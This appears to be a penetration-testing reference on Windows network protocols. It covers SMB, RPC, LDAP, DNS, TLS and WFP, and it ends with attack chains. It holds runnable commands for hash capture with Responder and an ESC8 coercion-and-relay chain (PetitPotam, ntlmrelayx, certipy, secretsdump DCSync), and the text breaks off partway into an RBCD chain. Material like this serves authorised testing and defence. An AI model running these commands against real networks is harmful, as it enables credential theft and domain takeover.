SMB Authentication

SMB supports multiple authentication mechanisms through the SPNEGO (Simple and Protected GSSAPI Negotiation Mechanism) framework:

  • NTLM Authentication: Challenge-response mechanism. Server sends a challenge, client responds with NTHash-derived response. Susceptible to relay and cracking attacks.
  • Kerberos Authentication: Ticket-based. Client obtains TGT from KDC, then requests service ticket for the target SPN (e.g., cifs/fileserver.domain.local). Preferred in domain environments.
  • Anonymous Access: Null session — no credentials. Uses IPC$ for certain enumeration. Largely restricted in modern Windows but still present in misconfigured environments.
  • Guest Access: Disabled by default on Server 2019+. When enabled, failed auth may fall back to guest, granting read access to shares configured for "Everyone".

NTLM Authentication Flow (SMB Context)

# NTLM Type Messages in SMB:
# 1. Client → Server: SMB_COM_SESSION_SETUP (NTLMSSP_NEGOTIATE)
#    Contains: Flags, domain, workstation name
# 2. Server → Client: SMB_COM_SESSION_SETUP response (NTLMSSP_CHALLENGE)
#    Contains: Server challenge (8 bytes), target info, flags
# 3. Client → Server: SMB_COM_SESSION_SETUP (NTLMSSP_AUTH)
#    Contains: LM/NT response, domain, username, workstation
#    NTLMv2: HMAC-MD5(NTHash, uppercase(user)+domain) → key
#    Response = HMAC-MD5(key, server_challenge + client_blob)

SMB Signing

SMB signing provides message integrity. Each packet includes a signature (HMAC over packet content using the session key). Critical for preventing relay attacks.

SettingRegistry PathDefault (Workstation)Default (DC)
Digitally sign communications (always) HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\RequireSecuritySignature 0 (Disabled) 1 (Enabled)
Digitally sign communications (if client agrees) HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\EnableSecuritySignature 1 (Enabled) 1 (Enabled)

Impact on Relay: If signing is NOT required, an attacker can intercept NTLM auth and relay it to another target. The relayed session won't be signed because the attacker doesn't have the session key to compute valid signatures. When signing IS required, the target rejects unsigned messages, blocking relay.

Named Pipes over SMB

Named pipes are endpoints for IPC. Over the network, they are accessed via IPC$ share: \\server\IPC$\pipename. Many critical Windows services expose RPC interfaces over named pipes:

  • \pipe\spoolss — Print Spooler (MS-RPRN, abused by PrinterBug)
  • \pipe\efsrpc — Encrypting File System (MS-EFSR, abused by PetitPotam)
  • \pipe\netlogon — Netlogon service (MS-NRPC)
  • \pipe\samr — SAM Remote (user enumeration)
  • \pipe\lsarpc — LSA Remote (SID/name translation, policy info)
  • \pipe\svcctl — Service Control Manager (PsExec uses this)
  • \pipe\atsvc — Task Scheduler
  • \pipe\winreg — Remote Registry

RPC / DCOM

RPC Architecture

Microsoft RPC (MS-RPC) is the backbone of Windows remote management. Built on DCE/RPC, it uses NDR (Network Data Representation) for marshaling.

  • Endpoint Mapper (EPM): TCP port 135. Maps RPC interface UUIDs to dynamic port numbers. Queried by clients before connecting to the actual service.
  • Dynamic Ports: By default 49152-65535 (Windows Server 2008+). Configurable via registry or firewall rules.
  • Transports: TCP (ncacn_ip_tcp), Named Pipes over SMB (ncacn_np), HTTP (ncacn_http — RPC over HTTP/RPC Proxy).

RPC Connection Flow

# 1. Client queries Endpoint Mapper on target:135
#    "What port is interface UUID e1af8308-5d1f-11c9-91a4-08002b14a0fa?"
# 2. EPM responds with dynamic port (e.g., 49667)
# 3. Client connects to target:49667 for actual RPC calls
# 4. Authentication occurs (NTLM/Kerberos via SPNEGO)

Named Pipes as RPC Transport

Many RPC services are available over named pipes (ncacn_np transport), accessed via IPC$ share over SMB (port 445). This means firewall rules blocking port 135 won't prevent access if port 445 is open.

# Format: ncacn_np:\\server[\pipe\pipename]
# Examples:
# \pipe\spoolss   → MS-RPRN (Print Spooler)
# \pipe\efsrpc    → MS-EFSR (EFS)
# \pipe\samr      → MS-SAMR (SAM)
# \pipe\lsarpc    → MS-LSAR (LSA)
# \pipe\netlogon  → MS-NRPC (Netlogon)
# \pipe\svcctl    → MS-SCMR (Service Control Manager)
# \pipe\atsvc     → MS-TSCH (Task Scheduler)

LDAP Bind Types

  • Simple Bind: Username + plaintext password. Insecure unless over TLS.
  • SASL Bind: Supports GSSAPI (Kerberos), DIGEST-MD5, NTLM. Preferred for domain-joined machines.
  • Anonymous Bind: No credentials. Very restricted on modern AD (default: rootDSE only).
  • Unauthenticated Bind: DN provided but empty password. Treated as anonymous by default.

DNS in Windows / Active Directory

AD-Integrated DNS Zones

AD-integrated DNS stores zone data in the AD database (not flat zone files). Replication follows AD topology. Benefits: secure dynamic updates, no zone transfer needed (replicates with AD), ACL-based access control.

  • Forward Lookup Zones: Hostname → IP resolution. _msdcs.domain.local holds DC locator records.
  • Reverse Lookup Zones: IP → Hostname. Often neglected in AD environments.
  • Application Partitions: DomainDnsZones (domain-wide), ForestDnsZones (forest-wide) control replication scope.
  • SRV Records: _ldap._tcp.dc._msdcs.domain.local, _kerberos._tcp.domain.local, _gc._tcp.domain.local — critical for domain operations.

LLMNR / NBT-NS / mDNS Poisoning

When DNS resolution fails, Windows falls back to broadcast/multicast protocols. An attacker on the local network can respond to these queries and capture NTLMv2 hashes.

  • LLMNR (Link-Local Multicast Name Resolution): UDP/5355. Multicast to 224.0.0.252. Used by Win Vista+.
  • NBT-NS (NetBIOS Name Service): UDP/137. Broadcast on local subnet. Legacy protocol.
  • mDNS (Multicast DNS): UDP/5353. Multicast to 224.0.0.251. Used by Apple/Linux, present on Win 10+.
# Responder - capture NTLM hashes from broadcast poisoning
# Start with all poisoners enabled
sudo responder -I eth0 -dwPv

# Responder - only poison specific protocols

# Responder - serve WPAD proxy file

TLS Downgrade Attacks

  • POODLE (CVE-2014-3566): Forces SSL 3.0 fallback, exploits CBC padding. Mitigate: disable SSL 3.0.
  • BEAST (CVE-2011-3389): CBC mode vulnerability in TLS 1.0. Mitigate: prefer TLS 1.2+, use GCM ciphers.
  • FREAK/Logjam: Force export-grade cryptography. Mitigate: disable DHE_EXPORT, RSA_EXPORT cipher suites.
  • ROBOT (CVE-2017-13099): Bleichenbacher oracle on RSA key exchange. Mitigate: disable RSA key exchange.

IPSec & Windows Filtering Platform

Windows Filtering Platform (WFP) Architecture

WFP is the network filtering framework in Windows (Vista+). It replaces the older NDIS filter drivers. All Windows firewall rules, IPSec policies, and third-party security products hook into WFP.

  • Filter Engine: Kernel-mode component that evaluates packets against filter rules at various layers.
  • Layers: Inbound/Outbound at Transport, Network, ALE (Application Layer Enforcement), Stream layers.
  • Callouts: Kernel drivers that perform deep inspection/modification (antivirus, DLP, etc.).
  • Base Filtering Engine (BFE): User-mode service managing filter/policy database.

Authentication Coercion — Complete Reference

Coercion + Relay Attack Chains

The most devastating Windows network attacks combine authentication coercion (forcing a privileged machine to authenticate to you) with NTLM relay (forwarding that auth to a target service). The classic chain:

  1. Coerce a DC to authenticate to attacker (PrinterBug/PetitPotam)
  2. Relay captured NTLM auth to ADCS HTTP enrollment (ESC8)
  3. Obtain a certificate for the DC machine account
  4. Use the certificate to authenticate as the DC (PKINIT)
  5. DCSync all domain hashes → full domain compromise
# Complete ESC8 Attack Chain:

# Step 1: Start ntlmrelayx targeting ADCS web enrollment
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Step 2: Coerce DC authentication
python3 PetitPotam.py attacker_ip dc01.corp.local
# OR
python3 printerbug.py corp.local/user:pass@dc01.corp.local attacker_ip

# Step 3: ntlmrelayx enrolls cert as DC01$ → outputs base64 cert

# Step 4: Authenticate with the certificate
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
# Outputs NT hash for DC01$ machine account

# Step 5: DCSync with the DC hash
impacket-secretsdump -hashes :NTHASH corp.local/dc01\$@dc01.corp.local

Coercion + RBCD Chain

# When ADCS is not available, relay to LDAP for RBCD:

# Step 1: Create a machine account (or use existing controlled account)
impacket-addcomputer corp.local/user:pass -computer-name 'FAKEPC$' -computer-pass 'FakePass123'

# Step 2: Start relay targeting LDAP, configuring RBCD on the coerced machine
